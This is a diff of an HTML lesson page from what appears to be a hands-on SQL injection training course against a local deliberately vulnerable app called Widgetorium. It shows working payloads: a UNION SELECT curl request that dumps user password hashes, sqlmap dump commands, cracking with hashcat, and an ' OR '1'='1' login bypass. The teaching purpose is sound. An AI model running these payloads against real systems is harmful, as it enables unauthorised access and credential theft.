@@ -9,13 +9,14 @@
 <body>
 <h1>Session 2: SQL Injection, Four Ways</h1>
 <p>Goal for this session: exploit all four of Widgetorium's SQL injection bugs and understand why they are four separate bugs and not one. Two of them a scanner hands you. One of them a scanner will never find. One of them is really two bugs sharing an endpoint. By the end you will have the admin's password hash and a file read off the database host.</p>
+<p>Work every one of these by hand first. Break the query with a single quote and read the error. Count the columns with <code>ORDER BY</code> until it fails. Line up the <code>UNION</code> yourself. Only once you have exploited the point manually do you hand the same parameter to sqlmap, and the point of running sqlmap then is to see how it automates the enumeration you just did by hand, not to have it find the bug for you.</p>
 <h2>2.1 The Search Box: UNION-Based, Reads Any Table</h2>
-<p>The storefront search concatenates your term straight into a <code>LIKE</code> clause, and it selects three columns, so a <code>UNION SELECT</code> lines up cleanly.</p>
+<p>Start with a broken quote and read what comes back: <code>?q=%27</code> returns the raw failing query, which tells you the columns are <code>id, name, price</code>. Three columns, so a <code>UNION SELECT</code> of three lines up cleanly.</p>
 <pre>curl -s "http://127.0.0.1:8080/search.php?q=x' UNION SELECT username,password_hash,role FROM users-- -"</pre>
-<p>The results table now lists every account and its unsalted MD5 hash. Hand that to <code>sqlmap</code> to see it work the problem systematically:</p>
+<p>The results table now lists every account and its unsalted MD5 hash. Now hand the same parameter to <code>sqlmap</code> and watch it work the problem systematically:</p>
 <pre>sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch --dbs
 sqlmap -u 'http://127.0.0.1:8080/search.php?q=x' --batch -D widgetorium -T users --dump</pre>
-<p>Then take the hashes to <code>john</code> or <code>hashcat</code> with a rockyou-class wordlist. The seed passwords are all in it. This is where a trainee first feels the difference between "the scanner said injectable" and "I have the admin's password."</p>
+<p>Then take the hashes to <code>hashcat</code> with a rockyou-class wordlist. The seed passwords are all in it. This is where a trainee first feels the difference between "the scanner said injectable" and "I have the admin's password."</p>
 <h2>2.2 The Login Form: Authentication Bypass</h2>
 <p>The login query concatenates both the username and the password hash. The classic payload in the username field returns the first row in the table, which is the seed admin.</p>
 <pre>curl -si --data-urlencode "username=' OR '1'='1' -- " --data "password=x" \
